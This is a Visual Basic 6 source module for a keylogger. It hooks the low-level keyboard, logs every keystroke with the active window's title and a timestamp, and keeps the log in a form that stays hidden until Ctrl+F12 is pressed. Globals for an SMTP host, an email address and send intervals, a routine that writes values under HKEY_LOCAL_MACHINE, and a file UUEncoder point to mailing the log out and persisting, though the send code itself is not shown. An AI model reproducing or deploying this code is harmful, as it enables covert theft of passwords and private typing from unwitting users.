Attribute VB_Name = "modKbHook"
Option Explicit

Global Const WH_KEYBOARD_LL = 13
Public Const HKEY_LOCAL_MACHINE = &H80000002
Public Const HKEY_CURRENT_USER = &H80000001
Public Const STANDARD_RIGHTS_ALL = &H1F0000
Public Const KEY_QUERY_VALUE = &H1
Public Const KEY_SET_VALUE = &H2
Public Const KEY_CREATE_SUB_KEY = &H4
Public Const KEY_ENUMERATE_SUB_KEYS = &H8
Public Const KEY_NOTIFY = &H10
Public Const KEY_CREATE_LINK = &H20
Public Const SYNCHRONIZE = &H100000
Public Const KEY_ALL_ACCESS = ((STANDARD_RIGHTS_ALL _
            Or KEY_QUERY_VALUE Or _
            KEY_SET_VALUE Or KEY_CREATE_SUB_KEY Or _
            KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY Or _
            KEY_CREATE_LINK) And (Not SYNCHRONIZE))

Public Const ERROR_NONE = 0
Public Const REG_SZ = 1
Public Const REG_DWORD = 4
            
Public hook             As Long
Public prehWnd          As Long

Public FileName         As String
Public SMTPHostName     As String
Public EmailAdd         As String
Public SaveInterval     As Integer
Public EmailInterval    As Integer
Public UseEmail         As Integer
Public StartUp          As Integer



Type HookStruct
    vkCode              As Long
    ScanCode            As Long
    flags               As Long
    time                As Long
    dwExtraInfo         As Long
End Type
Public Type BROWSEINFO
    hOwner As Long
    pidlRoot As Long
    pszDisplayName As String
    lpszTitle As String
    ulFlags As Long
    lpfn As Long
    lParam As Long
    iImage As Long
End Type

Public Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hHook As Long) As Long
Public Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Long, ByVal lpfn As Long, ByVal hmod As Long, ByVal dwThreadId As Long) As Long
Public Declare Function RegOpenKeyEx Lib "advapi32.dll" _
    Alias "RegOpenKeyExA" (ByVal HKEY As Long, _
    ByVal lpSubKey As String, ByVal ulOptions As Long, _
    ByVal samDesired As Long, phkResult As Long) _
As Long
Public Declare Function RegDeleteValue Lib "advapi32.dll" _
    Alias "RegDeleteValueA" (ByVal HKEY As Long, _
    ByVal lpValueName As String) _
As Long
Public Declare Function RegCloseKey Lib "advapi32.dll" _
                (ByVal HKEY As Long) _
As Long
Public Declare Function RegSetValueExString Lib "advapi32.dll" _
    Alias "RegSetValueExA" (ByVal HKEY As Long, _
    ByVal lpValueName As String, ByVal Reserved As Long, _
    ByVal dwType As Long, ByVal lpData As String, ByVal cbData As Long) _
As Long
Public Declare Function RegSetValueExLong Lib "advapi32.dll" _
    Alias "RegSetValueExA" (ByVal HKEY As Long, _
    ByVal lpValueName As String, ByVal Reserved As Long, _
    ByVal dwType As Long, lpData As Long, ByVal cbData As Long) _
As Long

Private Const HC_ACTION = 0
Private Const vbKeyAlt = 164
Private Const BIF_RETURNONLYFSDIRS = 1
Private Const BIF_DONTGOBELOWDOMAIN = 2
Private Const MAX_PATH = 260
'Private Const SWP_HIDEWINDOW = &H80
'Private Const SWP_SHOWWINDOW = &H40

Private Declare Function CallNextHookEx Lib "user32" (ByVal hHook As Long, ByVal ncode As Long, ByVal wParam As Long, lParam As Any) As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)

Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Private Declare Function GetForegroundWindow Lib "user32" () As Long

Private Declare Function SHBrowseForFolder Lib _
    "shell32.dll" Alias "SHBrowseForFolderA" (lpBrowseInfo As BROWSEINFO) _
As Long
Private Declare Function SHGetPathFromIDList Lib "shell32" _
    (ByVal pidList As Long, _
    ByVal lpBuffer As String) _
As Long
    
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
'Private Declare Function SetWindowPos Lib "user32" (ByVal hWnd As Long, ByVal hwndInsertAfter As Long, ByVal X As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long

Private Function GetCapslock() As Boolean
' Return or set the Capslock toggle.

    GetCapslock = CBool(GetKeyState(vbKeyCapital) And 1)

End Function

Private Function GetShift() As Boolean

' Return or set the Shift toggle.

    GetShift = CBool(GetAsyncKeyState(vbKeyShift))

End Function
Private Function GetNumLock() As Boolean

' Return or set the NumLock toggle.

    GetNumLock = CBool(GetAsyncKeyState(vbKeyNumlock))

End Function
Private Function AltKey() As Boolean

' Return or set the Alt toggle.
    
    AltKey = CBool(GetAsyncKeyState(vbKeyNumlock))
End Function

Private Function CtrlKey() As Boolean

' Return or set the Ctrl toggle.
    
    CtrlKey = CBool(GetAsyncKeyState(vbKeyControl))
End Function

Public Function GetKey(ByVal code As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
    Dim kybd As HookStruct
    Dim presenthWnd As Long
    Dim RetVal As Long, KeyAscii As Long, captionName As String, captionLen As Integer
    GetKey = GetKey
    If code = HC_ACTION And wParam <> 257 Then
        presenthWnd = GetForegroundWindow
        If prehWnd <> presenthWnd Then
            prehWnd = presenthWnd
            captionLen = GetWindowTextLength(presenthWnd)
            captionName = Space(captionLen)
            RetVal = GetWindowText(presenthWnd, captionName, captionLen + 1)
            frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & vbCrLf & "=======================================================" & vbCrLf
            frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & vbCrLf & captionName & vbTab & Format(Now, "dddd, mmm d yyyy") & " " & Format(Now, "hh:mm:ss AMPM") & vbCrLf
        End If
        CopyMemory kybd, ByVal lParam, Len(kybd)
        Select Case kybd.vkCode
            Case vbKeyCancel
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{Cancle}"
                ' Cancle key
            Case vbKeyBack
                ' BackSpace
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{BackSpace}"
            Case vbKeyTab
                ' Tab
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & Chr(vbKeyTab)
            Case vbKeyClear
                ' Clear
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{Clear}"
            Case vbKeyReturn
                ' Enter
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & vbCrLf
            Case vbKeyMenu
                ' Menu
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{Menu}"
            Case vbKeyPause
                ' Pause
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{Pause}"
            Case vbKeyEscape
                ' Esc
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{Esc}"
            Case vbKeySpace
                ' SpaceBar
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & Chr(vbKeySpace)
            Case vbKeyPageUp
                ' PageUp
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{PageUp}"
            Case vbKeyPageDown
                ' PageDown
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{PageDown}"
            Case vbKeyEnd
                ' EndKey
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{End}"
            Case vbKeyHome
                ' HomeKey
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{Home}"
            Case vbKeyLeft
                ' LeftArrow
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{LArrow}"
            Case vbKeyUp
                ' UpArrow
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{UArrow}"
            Case vbKeyRight
                ' RightArrow
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{RArrow}"
            Case vbKeyDown
                ' DownArrow
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{DArrow}"
            Case vbKeySelect
                ' SelectKey
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{Select}"
            Case vbKeyPrint
                ' Print Screen
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{PrintScr}"
            Case vbKeyExecute
                ' ExecuteKey(!)
            Case vbKeySnapshot
                ' Snapshot(!)
            Case vbKeyInsert
                ' INS key
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{Ins}"
            Case vbKeyDelete
                ' Delete key
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{Del}"
            Case vbKeyHelp
                ' HelpKey(!)
            Case 65 To 90
                If GetCapslock Then
                    If GetShift Then
                       frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & LCase(Chr(kybd.vkCode))
                    Else
                        frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & UCase(Chr(kybd.vkCode))
                    End If
                Else
                    If GetShift Then
                        frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & UCase(Chr(kybd.vkCode))
                    Else
                        frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & LCase(Chr(kybd.vkCode))
                    End If
                End If
            Case 48
                If GetShift Then
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & ")"
                Else
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "0"
                End If
            Case 49
                If GetShift Then
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "!"
                Else
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "1"
                End If
            Case 50
                If GetShift Then
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "@"
                Else
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "2"
                End If
            Case 51
                If GetShift Then
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "#"
                Else
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "3"
                End If
            Case 52
                If GetShift Then
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "$"
                Else
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "4"
                End If
            Case 53
                If GetShift Then
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "%"
                Else
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "5"
                End If
            Case 54
                If GetShift Then
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "^"
                Else
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "6"
                End If
            Case 55
                If GetShift Then
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "&"
                Else
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "7"
                End If
            Case 56
                If GetShift Then
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "*"
                Else
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "8"
                End If
            Case 57
                If GetShift Then
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "("
                Else
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "9"
                End If
            Case 192
                If GetShift Then
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "~"
                Else
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "`"
                End If
            Case 189
                If GetShift Then
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "_"
                Else
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "-"
                End If
            Case 187
                If GetShift Then
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "+"
                Else
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "="
                End If
            Case 220
                If GetShift Then
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "|"
                Else
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "\"
                End If
            Case 229
                If GetShift Then
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{"
                Else
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "["
                End If
            Case 221
                If GetShift Then
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "}"
                Else
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "]"
                End If
            Case 186
                If GetShift Then
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & ":"
                Else
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & ";"
                End If
            Case 222
                If GetShift Then
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & Chr(34)
                Else
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "'"
                End If
            Case 188
                If GetShift Then
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "<"
                Else
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & ","
                End If
            Case 190
                If GetShift Then
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & ">"
                Else
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "."
                End If
            Case 191
                If GetShift Then
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "?"
                Else
                    frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "/"
                End If
            
            Case 96 To 105
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & Chr(kybd.vkCode - 48)
            
            Case vbKeyMultiply
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "*"
            Case vbKeyAdd
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "+"
            Case vbKeySeparator
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & vbCrLf
            Case vbKeySubtract
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "-"
            Case vbKeyDecimal
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "."
            Case vbKeyDivide
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "/"
                
            Case vbKeyF1
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{F1}"
            Case vbKeyF2
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{F2}"
            Case vbKeyF3
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{F3}"
            Case vbKeyF4
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{F4}"
            Case vbKeyF5
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{F5}"
            Case vbKeyF6
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{F6}"
            Case vbKeyF7
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{F7}"
            Case vbKeyF8
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{F8}"
            Case vbKeyF9
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{F9}"
            Case vbKeyF10
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{F10}"
            Case vbKeyF11
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{F11}"
            Case vbKeyF12
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{F12}"
                If CtrlKey Then
'                    Debug.Print "Ctrl + F12"
                    frmKeybd.Visible = True
                End If
                
            Case 91
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{Win}"
            Case 92
                frmKeybd.txtKeyCode.Text = frmKeybd.txtKeyCode.Text & "{Win}"
    
            Case Else
'                Debug.Print kybd.vkCode
            
            
        End Select
        

    Else
        'keyup event
        GetKey = CallNextHookEx(hook, code, wParam, lParam)
    End If
    
End Function

Public Sub SetKeyValueC(sKeyName As String, SvalueName _
        As String, vValueSetting As Variant, _
        IValueType As Long)
        
    Dim IretVal, HKEY As Long
    IretVal = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _
            sKeyName, 0, KEY_ALL_ACCESS, HKEY)
    IretVal = SetValueEx(HKEY, SvalueName, IValueType, vValueSetting)
    RegCloseKey (HKEY)
End Sub

Public Function SetValueEx(ByVal HKEY As Long, _
        SvalueName As String, IType As Long, vValue As Variant) _
        As Long
        
       Dim IValue As Long
       Dim sValue As String
    Select Case IType
        Case REG_SZ:
            sValue = vValue & Chr$(0)
            
            SetValueEx = RegSetValueExString(HKEY, SvalueName, _
                0&, IType, sValue, Len(sValue))
        Case REG_DWORD:
            IValue = vValue
            SetValueEx = RegSetValueExLong(HKEY, SvalueName, _
                0&, IType, IValue, 4)
        End Select
        
            
End Function

Public Function GetFolderName(hwnd As Long, Optional Title As String) As String
    Dim Info As BROWSEINFO
    Dim rtValue As Long
    Dim FolderName As String
    
    
    Info.hOwner = hwnd
    Info.pidlRoot = 0
    If Title = "" Then
        Info.lpszTitle = "Select a Folder" & Chr(0)
    Else
        Info.lpszTitle = Title & Chr(0)
    End If
    Info.ulFlags = BIF_RETURNONLYFSDIRS + BIF_DONTGOBELOWDOMAIN
    rtValue = SHBrowseForFolder(Info)
    If (rtValue) Then
        FolderName = Space(MAX_PATH)
        SHGetPathFromIDList rtValue, FolderName
        GetFolderName = Left(FolderName, InStr(FolderName, vbNullChar) - 1)
    Else
        GetFolderName = ""
    End If
End Function

Public Function UUEncodeFile(strFilePath As String) As String

    Dim intFile         As Integer      'file handler
    Dim intTempFile     As Integer      'temp file
    Dim lFileSize       As Long         'size of the file
    Dim strFilename     As String       'name of the file
    Dim strFileData     As String       'file data chunk
    Dim lEncodedLines   As Long         'number of encoded lines
    Dim strTempLine     As String       'temporary string
    Dim i               As Long         'loop counter
    Dim j               As Integer      'loop counter
    
    Dim strResult       As String
    '
    'Get file name
    strFilename = Mid$(strFilePath, InStrRev(strFilePath, "\") + 1)
    '
    'Insert first marker: "begin 664 ..."
    strResult = "begin 664 " + strFilename + vbCrLf
    '
    'Get file size
    lFileSize = FileLen(strFilePath)
    lEncodedLines = lFileSize \ 45 + 1
    '
    'Prepare buffer to retrieve data from
    'the file by 45 symbols chunks
    strFileData = Space(45)
    '
    intFile = FreeFile
    '
    Open strFilePath For Binary As intFile
        For i = 1 To lEncodedLines
            'Read file data by 45-bytes cnunks
            '
            If i = lEncodedLines Then
                'Last line of encoded data often is not
                'equal to 45, therefore we need to change
                'size of the buffer
                strFileData = Space(lFileSize Mod 45)
            End If
            'Retrieve data chunk from file to the buffer
            Get intFile, , strFileData
            'Add first symbol to encoded string that informs
            'about quantity of symbols in encoded string.
            'More often "M" symbol is used.
            strTempLine = Chr(Len(strFileData) + 32)
            '
            If i = lEncodedLines And (Len(strFileData) Mod 3) Then
                'If the last line is processed and length of
                'source data is not a number divisible by 3, add one or two
                'blankspace symbols
                strFileData = strFileData + Space(3 - (Len(strFileData) Mod 3))
            End If
            
            For j = 1 To Len(strFileData) Step 3
                'Breake each 3 (8-bits) bytes to 4 (6-bits) bytes
                '
                '1 byte
                strTempLine = strTempLine + Chr(Asc(Mid(strFileData, j, 1)) \ 4 + 32)
                '2 byte
                strTempLine = strTempLine + Chr((Asc(Mid(strFileData, j, 1)) Mod 4) * 16 _
                               + Asc(Mid(strFileData, j + 1, 1)) \ 16 + 32)
                '3 byte
                strTempLine = strTempLine + Chr((Asc(Mid(strFileData, j + 1, 1)) Mod 16) * 4 _
                               + Asc(Mid(strFileData, j + 2, 1)) \ 64 + 32)
                '4 byte
                strTempLine = strTempLine + Chr(Asc(Mid(strFileData, j + 2, 1)) Mod 64 + 32)
            Next j
            'replace " " with "`"
            strTempLine = Replace(strTempLine, " ", "`")
            'add encoded line to result buffer
            strResult = strResult + strTempLine + vbCrLf
            'reset line buffer
            strTempLine = ""
        Next i
    Close intFile

    'add the end marker
    strResult = strResult & "`" & vbCrLf + "end" + vbCrLf
    'asign return value
    UUEncodeFile = strResult
    
End Function


'Public Sub HideWindow(hWnd As Long)
'    Call SetWindowPos(hWnd, 0, 0, 0, 0, 0, SWP_HIDEWINDOW)
'End Sub
'
'Public Sub ShowWindow(hWnd As Long)
'    Call SetWindowPos(hWnd, 0, 0, 0, 0, 0, SWP_SHOWWINDOW)
'End Sub

